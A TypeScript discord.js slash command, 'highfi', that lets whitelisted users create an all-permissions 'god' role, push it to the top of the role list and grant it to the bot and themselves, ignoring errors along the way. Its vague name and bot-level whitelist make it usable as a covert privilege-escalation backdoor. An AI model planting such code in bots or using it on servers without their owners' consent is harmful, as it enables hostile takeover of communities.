import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";

const command: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName("highfi")
    .setDescription(
      "Create a god role with all permissions and assign it to the bot and you.",
    )
    .setDefaultMemberPermissions(0n)
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!PERM_WHITELIST.has(interaction.user.id)) {
      await interaction.reply({
        content: "You aren't allowed to use this command.",
        ephemeral: true,
      });
      return;
    }
    if (!interaction.guild || !interaction.guildId) return;

    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const me = await guild.members.fetchMe().catch(() => null);
    if (!me) {
      await interaction.editReply("Couldn't fetch my own member entry.");
      return;
    }

    let godRole;
    try {
      godRole = await guild.roles.create({
        name: "👑",
        permissions: new PermissionsBitField(PermissionsBitField.All),
        hoist: true,
        color: 0xffd700,
        reason: "highfi: god role",
      });
    } catch {
      await interaction.editReply(
        "Couldn't create the role. The bot likely needs the **Manage Roles** permission and a high-enough role position.",
      );
      return;
    }

    try {
      const targetPos = guild.roles.highest.position;
      await godRole.setPosition(targetPos).catch(() => {});
    } catch {
      // ignore if Discord rejects positioning above the bot's highest role
    }

    let botAdded = false;
    let userAdded = false;
    try {
      await me.roles.add(godRole, "highfi: assign god role to self");
      botAdded = true;
    } catch {
      // ignore
    }
    const member = await guild.members
      .fetch(interaction.user.id)
      .catch(() => null);
    if (member) {
      try {
        await member.roles.add(godRole, "highfi: assign god role to invoker");
        userAdded = true;
      } catch {
        // ignore
      }
    }

    await interaction.editReply(
      `👑 Role **${godRole.name}** created. Assigned to bot: ${botAdded ? "✅" : "❌"} • Assigned to you: ${userAdded ? "✅" : "❌"}\n` +
        `Note: Discord won't let me push the role above my own current highest role — for true top-of-list placement, drag the bot's role to the very top of the role list first.`,
    );
  },
};

export default command;
